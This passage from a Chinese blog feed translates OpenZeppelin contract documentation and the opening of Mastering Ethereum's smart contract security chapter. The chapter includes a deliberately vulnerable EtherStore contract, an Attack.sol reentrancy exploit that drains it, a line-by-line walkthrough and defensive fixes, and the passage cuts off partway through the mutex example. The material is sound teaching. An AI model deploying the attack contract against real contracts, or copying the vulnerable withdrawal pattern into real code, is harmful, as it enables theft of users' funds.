function">transferERC721</span><span class="token punctuation">(</span>        <span class="token builtin">address</span> token<span class="token punctuation">,</span>        <span class="token builtin">address</span> to<span class="token punctuation">,</span>        <span class="token builtin">uint256</span> tokenId    <span class="token punctuation">)</span>        <span class="token keyword">public</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span><span class="token function">supportsInterface</span><span class="token punctuation">(</span>InterfaceId_ERC721<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"IS_NOT_721_TOKEN"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">IERC721</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span> to<span class="token punctuation">,</span> tokenId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h3><p>OpenZeppelin Contracts 提供的最流行的数学相关库是 <a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#SafeMath"><code>SafeMath</code></a>，它提供了保护您的合约免受上溢和下溢的数学函数。</p><p>通过 <code>using SafeMath for uint256;</code> 包含合约；然后调用函数：</p><ul><li><code>myNumber.add(otherNumber)</code></li><li><code>myNumber.sub(otherNumber)</code></li><li><code>myNumber.div(otherNumber)</code></li><li><code>myNumber.mul(otherNumber)</code></li><li><code>myNumber.mod(otherNumber)</code></li></ul><h3 id="Payment"><a href="#Payment" class="headerlink" title="Payment"></a>Payment</h3><p>想要在多人之间分摊一些付款？也许你有一个应用程序，将 30% 的艺术品购买发送给原始创作者，将 70% 的利润发送给当前所有者；您可以使用 <a href="https://docs.openzeppelin.com/contracts/4.x/api/finance#PaymentSplitter"><code>PaymentSplitter</code></a>  构建它！</p><p>在 Solidity 中，盲目地向账户汇款存在一些安全问题，因为它允许账户执行任意代码。您可以在 <a href="https://consensys.github.io/smart-contract-best-practices/">Ethereum Smart Contract Best Practices</a> 网站上阅读这些安全问题。解决重入和停滞问题的方法之一是，您可以使用 <a href="https://docs.openzeppelin.com/contracts/4.x/api/security#PullPayment"><code>PullPayment</code></a>，而不是立即将 Ether 发送到需要它的帐户，它提供了一个 <a href="https://docs.openzeppelin.com/contracts/4.x/api/security#PullPayment-_asyncTransfer-address-uint256-"><code>_asyncTransfer</code></a>  函数，用于向某物汇款并要求他们稍后再 <a href="https://docs.openzeppelin.com/contracts/4.x/api/security#PullPayment-withdrawPayments-address-payable-"><code>withdrawPayments()</code></a>。</p><p>如果你想托管一些资金，请查看 <a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#Escrow"><code>Escrow</code></a> 和 <a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#ConditionalEscrow"><code>ConditionalEscrow</code></a> 以管理一些托管 Ether 的释放。</p><h3 id="Collections"><a href="#Collections" class="headerlink" title="Collections"></a>Collections</h3><p>如果您需要比 Solidity 的原生数组和映射更强大的集合支持，请查看 <a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet"><code>EnumerableSet</code></a>  和 <a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableMap"><code>EnumerableMap</code></a>。它们类似于映射，因为它们在恒定时间内存储和删除元素并且不允许重复条目，但它们还支持枚举(<em>enumeration</em>)，这意味着您可以轻松地查询链上和链下的所有存储条目。</p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><p>想检查地址是否为合约？使用 <a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#Address"><code>Address</code></a> 和 <a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#Address-isContract-address-"><code>Address.isContract()</code></a>。</p><p>想要跟踪一些每次需要另一个数字时递增 1 的数字？查看 <a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#Counters"><code>Counters</code></a>。这对很多事情都很有用，例如创建增量标识符，如 <a href="https://docs.openzeppelin.com/contracts/4.x/erc721">ERC721 指南</a> 中所示。</p><h4 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h4><p><a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#Base64"><code>Base64</code></a> 实用程序允许您将 <code>bytes32</code> 数据转换为其 Base64 <code>string</code> 表示。</p><p>这对于为 <a href="https://docs.openzeppelin.com/contracts/4.x/api/token/ERC721#IERC721Metadata-tokenURI-uint256-"><code>ERC721</code></a> 或 <a href="https://docs.openzeppelin.com/contracts/4.x/api/token/ERC1155#IERC1155MetadataURI-uri-uint256-"><code>ERC1155</code></a> 构建 URL 安全的 tokenURI 特别有用。该库提供了一种巧妙的方式来提供符合 URL 安全的 <a href="https://developer.mozilla.org/docs/Web/HTTP/Basics_of_HTTP/Data_URIs/">Data URI</a> 兼容字符串以提供链上数据结构。</p><p>考虑这是一个使用 ERC721 通过 Base64 Data URI 发送 JSON 元数据的示例：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// contracts/My721Token.sol</span><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">import</span> <span class="token string">"@openzeppelin/contracts/token/ERC721/ERC721.sol"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"@openzeppelin/contracts/utils/Strings.sol"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"@openzeppelin/contracts/utils/Base64.sol"</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">My721Token</span> <span class="token keyword">is</span> ERC721 <span class="token punctuation">&#123;</span>    <span class="token keyword">using</span> <span class="token class-name">Strings</span> <span class="token keyword">for</span> <span class="token builtin">uint256</span><span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token function">ERC721</span><span class="token punctuation">(</span><span class="token string">"My721Token"</span><span class="token punctuation">,</span> <span class="token string">"MTK"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">function</span> <span class="token function">tokenURI</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> tokenId<span class="token punctuation">)</span>        <span class="token keyword">public</span>        <span class="token keyword">pure</span>        override        <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token builtin">bytes</span> <span class="token keyword">memory</span> dataURI <span class="token operator">=</span> abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>            <span class="token string">'&#123;'</span><span class="token punctuation">,</span>                <span class="token string">'"name": "My721Token #'</span><span class="token punctuation">,</span> tokenId<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span>                <span class="token comment">// Replace with extra ERC721 Metadata properties</span>            <span class="token string">'&#125;'</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token builtin">string</span><span class="token punctuation">(</span>            abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>                <span class="token string">"data:application/json;base64,"</span><span class="token punctuation">,</span>                Base64<span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>dataURI<span class="token punctuation">)</span>            <span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h4 id="Multicall"><a href="#Multicall" class="headerlink" title="Multicall"></a>Multicall</h4><p>Multicall 抽象合约带有一个 <code>multicall</code> 函数，该函数将多个调用捆绑在一个外部调用中。有了它，外部帐户可以执行包含多个函数调用的原子操作。这不仅对 EOA 在单个交易中进行多次调用很有用，它也是一种在后续调用失败时恢复先前调用的方法。</p><p>考虑这个虚拟合约：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// contracts/Box.sol</span><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"@openzeppelin/contracts/utils/Multicall.sol"</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Box</span> <span class="token keyword">is</span> Multicall <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这是使用 Truffle 调用 <code>multicall</code> 函数的方法，允许在单个交易中调用 <code>foo</code>和<code>bar</code>：</p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// scripts/foobar.js</span><span class="token keyword">const</span> Box <span class="token operator">=</span> artifacts<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'Box'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> instance <span class="token operator">=</span> <span class="token keyword">await</span> Box<span class="token punctuation">.</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">await</span> instance<span class="token punctuation">.</span><span class="token function">multicall</span><span class="token punctuation">(</span><span class="token punctuation">[</span>    instance<span class="token punctuation">.</span>contract<span class="token punctuation">.</span>methods<span class="token punctuation">.</span><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeABI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    instance<span class="token punctuation">.</span>contract<span class="token punctuation">.</span>methods<span class="token punctuation">.</span><span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeABI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><p><a href="https://docs.openzeppelin.com/contracts/4.x/api/access">OpenZeppelin Docs API</a> 文档提供了库中所有 合约(<em>Contract</em>)、库(<em>Library</em>)、接口(<em>Interface</em>) 的 修饰符(<em>Modifier</em>)、函数(<em>Function</em>) 和 事件(<em>Events</em>) 等的用法和 API 说明，以供检索查阅。</p><p><strong>可以在顶部的搜索栏中检索关键字，搜索栏会在整个文档中查找匹配的对应关键字。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;OpenZeppelin-Contracts-4-x-文档&quot;&gt;&lt;a href=&quot;#OpenZeppelin-Contracts-4-x-文档&quot; class=&quot;headerlink&quot; title=&quot;OpenZeppelin Contracts 4.x 文档&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="智能合约开发" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="智能合约开发" scheme="https://alphafitz.com/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%BC%80%E5%8F%91/"/>
    
    <category term="以太坊" scheme="https://alphafitz.com/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
  </entry>
  
  <entry>
    <title>精通以太坊：智能合约安全</title>
    <link href="https://alphafitz.com/2022/09/13/mastering-ethereum-smart-contract-security/"/>
    <id>https://alphafitz.com/2022/09/13/mastering-ethereum-smart-contract-security/</id>
    <published>2022-09-13T15:09:47.000Z</published>
    <updated>2022-09-26T10:17:06.338Z</updated>
    
    <content type="html"><![CDATA[<h1 id="精通以太坊：智能合约安全"><a href="#精通以太坊：智能合约安全" class="headerlink" title="精通以太坊：智能合约安全"></a>精通以太坊：智能合约安全</h1><blockquote><p>本文内容是对 <a href="https://github.com/ethereumbook/ethereumbook/blob/develop/09smart-contracts-security.asciidoc">Mastering Ethereum</a> 一书的 Smart Contract Security 章节的翻译。</p></blockquote><p>编写智能合约时，安全性是最重要的考虑因素之一。在智能合约编程领域，错误代价高昂且容易被利用。在本章中，我们将研究安全最佳实践和设计模式，以及“安全反模式(<em>security antipatterns</em>)”，它们是可能在我们的智能合约中引入漏洞的实践和模式。</p><p>与其他程序一样，智能合约将准确执行所写的内容，这并不总是程序员的意图。此外，所有智能合约都是公开的，任何用户都可以通过创建交易与它们进行交互。任何漏洞都可以被利用，损失几乎总是无法挽回。因此，遵循最佳实践并使用经过充分测试的设计模式至关重要。</p><h2 id="安全最佳实践"><a href="#安全最佳实践" class="headerlink" title="安全最佳实践"></a>安全最佳实践</h2><p>防御性编程(<em>Defensive programming</em>)是一种特别适合智能合约的编程风格。它强调以下几点，所有这些都是最佳实践：</p><p><em>极简主义&#x2F;简单</em></p><p>复杂性是安全的敌人。代码越简单，代码越少，出现错误或无法预料的影响的可能性就越低。在第一次从事智能合约编程时，开发人员通常会尝试编写大量代码。相反，您应该仔细查看您的智能合约代码，并尝试找到减少代码行数、复杂性和“功能”的方法。如果有人告诉你他们的项目已经为他们的智能合约生成了“数千行代码”，你应该质疑那个项目的安全性。更简单更安全。</p><p><em>代码重用</em></p><p>尽量不要重新发明轮子。如果已经存在可以满足您大部分需求的库或合约，请重用它。在您自己的代码中，遵循 DRY 原则：不要重复自己(<em>Don’t Repeat Yourself</em>)。如果您看到任何代码片段重复多次，请问问自己是否可以将其编写为函数或库并重用。已被广泛使用和测试的代码可能比您编写的任何新代码都更安全。谨防“此处未发明(<em>No Invented Here</em>)”综合症，在这种情况下，您很想通过从头开始构建功能或组件来“改进”它。安全风险往往大于改进价值。</p><p><em>代码质量</em></p><p>智能合约代码是无情的。每个错误都可能导致金钱损失。您不应该将智能合约编程视为通用编程。使用 Solidity 编写 DApp 与使用 JavaScript 创建 Web 小部件不同。相反，您应该应用严格的工程和软件开发方法，就像在航空工程或任何类似的无情学科(<em>unforgiving discipline</em>)中一样。一旦你“启动”你的代码，你几乎无法解决任何问题。</p><p><em>可读性&#x2F;可审计性</em></p><p>您的代码应该清晰易懂。越容易阅读，就越容易审计。智能合约是公开的，因为每个人都可以读取字节码并且任何人都可以对其进行逆向工程。因此，使用协作和开源方法在公共场合开发您的工作是有益的，以利用开发人员社区的集体智慧并从开源开发的最高公分母中受益。你应该编写有据可查且易于阅读的代码，遵循以太坊社区的风格和命名约定。</p><p><em>测试覆盖率</em></p><p>尽可能测试一切。智能合约在公共执行环境中运行，任何人都可以使用他们想要的任何输入来执行它们。您永远不应假设输入（例如函数参数）格式正确、有适当界限或具有良性目的。测试所有参数以确保它们在预期范围内并且格式正确，然后才能继续执行代码。</p><h2 id="安全风险和反模式"><a href="#安全风险和反模式" class="headerlink" title="安全风险和反模式"></a>安全风险和反模式</h2><p>作为智能合约程序员，您应该熟悉最常见的安全风险，以便能够检测和避免使您的合约暴露于这些风险的编程模式。在接下来的几节中，我们将研究不同的安全风险、漏洞如何出现的示例，以及可用于解决这些问题的对策或预防性解决方案。</p><h2 id="重入-Reentrancy"><a href="#重入-Reentrancy" class="headerlink" title="重入 (Reentrancy)"></a>重入 (Reentrancy)</h2><p><strong>以太坊智能合约的特点之一是它们能够调用和利用来自其他外部合约的代码。</strong>合约通常还处理以太币，因此经常将以太币发送到各种外部用户地址。这些操作需要合约提交外部调用。这些外部调用可能被攻击者劫持，攻击者可以强制合约执行进一步的代码（通过 fallback 函数），包括对自身的调用。这种攻击被用于臭名昭著的 <a href="http://bit.ly/2DamSZT">DAO 攻击</a>。</p><p>有关重入攻击的进一步阅读，请参阅 Gus Guimareas 关于该主题的<a href="https://gus-tavo-guim.medium.com/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4">博客文章</a>和<a href="https://consensys.github.io/smart-contract-best-practices/">以太坊智能合约最佳实践</a>。</p><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>当合约将以太币发送到未知地址时，可能会发生这种类型的攻击。攻击者可以在 fallback 函数中小心地在包含恶意代码的外部地址构造合约。因此，当合约将以太币发送到该地址时，它将调用恶意代码。通常，恶意代码在易受攻击的合约上执行一个函数，执行开发人员不期望的操作。 “重入(<em>reentrancy</em>)”一词来自于外部恶意合约调用易受攻击合约上的函数并且代码执行的路径“重新进入”它。</p><p>为了理清这一点，请考虑 <a href="https://github.com/ethereumbook/ethereumbook/blob/develop/09smart-contracts-security.asciidoc#etherstore_vulnerable">EtherStore.sol</a> 中的简单易受攻击合约，它充当以太坊保险库，允许储户每周仅提取 1 个以太币。</p><p>示例1. EtherStore.sol</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">EtherStore</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">uint256</span> <span class="token keyword">public</span> withdrawalLimit <span class="token operator">=</span> <span class="token number">1</span> ether<span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">public</span> lastWithdrawTime<span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">depositFunds</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> withdrawFunds <span class="token punctuation">(</span><span class="token builtin">uint256</span> _weiToWithdraw<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> _weiToWithdraw<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// limit the withdrawal</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>_weiToWithdraw <span class="token operator">&lt;=</span> withdrawalLimit<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// limit the time allowed to withdraw</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>now <span class="token operator">>=</span> lastWithdrawTime<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> weeks<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span>call<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span>_weiToWithdraw<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> _weiToWithdraw<span class="token punctuation">;</span>        lastWithdrawTime<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> now<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>该合约有两个公共函数，<code>depositFunds</code> 和 <code>withdrawFunds</code>。 <code>depositFunds</code> 函数只是增加发送者的余额。 <code>withdrawFunds</code> 函数允许发送者指定要提取的 wei 数量。此功能仅在请求的提款金额小于 1 ether 且上周未发生提款时才会成功。</p><p>该漏洞位于第 17 行，合约向用户发送他们请求的以太币数量。考虑一个在 Attack.sol 中创建合约的攻击者。</p><p>示例2. Attack.sol</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">import</span> <span class="token string">"EtherStore.sol"</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Attack</span> <span class="token punctuation">&#123;</span>  EtherStore <span class="token keyword">public</span> etherStore<span class="token punctuation">;</span>  <span class="token comment">// intialize the etherStore variable with the contract address</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _etherStoreAddress<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      etherStore <span class="token operator">=</span> <span class="token function">EtherStore</span><span class="token punctuation">(</span>_etherStoreAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">attackEtherStore</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// attack to the nearest ether</span>      <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">>=</span> <span class="token number">1</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// send eth to the depositFunds() function</span>      etherStore<span class="token punctuation">.</span>depositFunds<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token number">1</span> ether<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// start the magic</span>      etherStore<span class="token punctuation">.</span><span class="token function">withdrawFunds</span><span class="token punctuation">(</span><span class="token number">1</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">collectEther</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>      msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// fallback function - where the magic happens</span>  <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>etherStore<span class="token punctuation">.</span>balance <span class="token operator">></span> <span class="token number">1</span> ether<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          etherStore<span class="token punctuation">.</span><span class="token function">withdrawFunds</span><span class="token punctuation">(</span><span class="token number">1</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>漏洞利用如何发生？首先，攻击者会使用 <code>EtherStore</code> 的合约地址作为唯一的构造函数参数来创建恶意合约（假设在地址 <code>0x0...123</code>）。这将初始化公共变量 <code>etherStore</code> 并将其指向要攻击的合约。</p><p>然后攻击者将调用 <code>attackEtherStore</code> 函数，其中一定数量的以太大于或等于1——让我们暂时假设 <code>1 ether</code>。在此示例中，我们还将假设许多其他用户已将以太币存入该合约，因此其当前余额为 <code>10 ether</code>。然后会出现以下情况：</p><ol><li><em>Attack.sol</em>，第 15 行：<code>EtherStore</code> 合约的 <code>depositFunds</code> 函数将被调用，<code>msg.value</code> 为 <code>1 ether</code>（以及大量gas）。发送者（<code>msg.sender</code>）将是恶意合约（<code>0x0…123</code>）。因此，<code>balance[0x0..123] = 1 ether</code>。</li><li><em>Attack.sol</em>，第 17 行：恶意合约随后将调用参数为 <code>1 ether</code> 的 <code>EtherStore</code> 合约的 <code>withdrawFunds</code> 函数。这将通过所有要求（<code>EtherStore</code> 合约的第 12-16 行），因为之前没有提款。</li><li><em>EtherStore.sol</em>，第 17 行：合约会将 <code>1 ether</code> 发送回恶意合约。</li><li><em>Attack.sol</em>，第 25 行：支付给恶意合约的款项将执行 fallback 函数。</li><li><em>Attack.sol</em>，第 26 行：EtherStore 合约的总余额是 <code>10 ether</code>，现在是 <code>9 ether</code>，所以这个 if 语句通过了。</li><li><em>Attack.sol</em>，第 27 行：回退函数再次调用 <code>EtherStore</code> 的 <code>withdrawFunds</code> 函数并“重新进入”<code>EtherStore</code> 合约。</li><li><em>EtherStore.sol</em>，第 11 行：在第二次调用 <code>withdrawFunds</code> 时，攻击合约的余额仍然是 <code>1 ether</code>，因为第 18 行尚未执行。因此，我们仍然有 <code>balances[0x0..123] = 1 ether</code>。<code>lastWithdrawTime</code> 变量也是如此。同样，我们通过了所有要求。</li><li><em>EtherStore.sol</em>，第 17 行：攻击合约提取另外 <code>1 ether</code>。</li><li>重复步骤 4-8，直到 <code>EtherStore.balance &gt; 1</code> 不再出现，如 Attack.sol 中的第 26 行所示。</li><li><em>Attack.sol</em>，第 26 行：一旦 <code>EtherStore</code> 合约中剩下 1 个（或更少）以太币，这个 <code>if</code> 语句就会失败。然后，这将允许执行 <code>EtherStore</code>合约的第 18 行和第 19 行（每次调用<code>withdrawFunds</code> 函数）。</li><li><em>EtherStore.sol</em>，第 18 行和第 19 行：<code>balances</code> 和 <code>lastWithdrawTime</code> 映射将被设置，执行将结束。</li></ol><p>最终结果是攻击者在一次交易中从 <code>EtherStore</code> 合约中提取了除 1 个以太币之外的所有以太币。</p><h3 id="预防技术"><a href="#预防技术" class="headerlink" title="预防技术"></a>预防技术</h3><p>有许多常用技术可以帮助避免智能合约中潜在的重入漏洞。<strong>第一个是（尽可能）在向外部合约发送以太币时使用内置的transfer函数。</strong>transfer 函数只发送 2300 gas 与外部调用，这不足以让目标地址&#x2F;合约调用另一个合约（即重新进入发送合约）。</p><p><strong>第二种技术是确保所有更改状态变量的逻辑都发生在以太被发送出合约（或任何外部调用）之前。</strong>在 <code>EtherStore</code> 示例中，应将 EtherStore.sol 的第 18 行和第 19 行放在第 17 行之前。<strong>对于对未知地址执行外部调用的任何代码，最好将其作为本地化函数或代码执行中的最后一个操作。</strong>这被称为<a href="https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern">checks-effects-interactions pattern</a>。</p><p><strong>第三种技术是引入互斥锁(mutex)——即添加一个状态变量，在代码执行期间锁定合约，防止重入调用。</strong></p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">EtherStore</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// initialize the mutex</span>    <span class="token builtin">bool</span> reEntrancyMutex <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token builtin">uint256</span> <span class="token keyword">public</span> withdrawalLimit <span class="token operator">=</span> <span class="token number">1</span> ether<span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">public</span> lastWithdrawTime<span class="token punctuation">;</span>    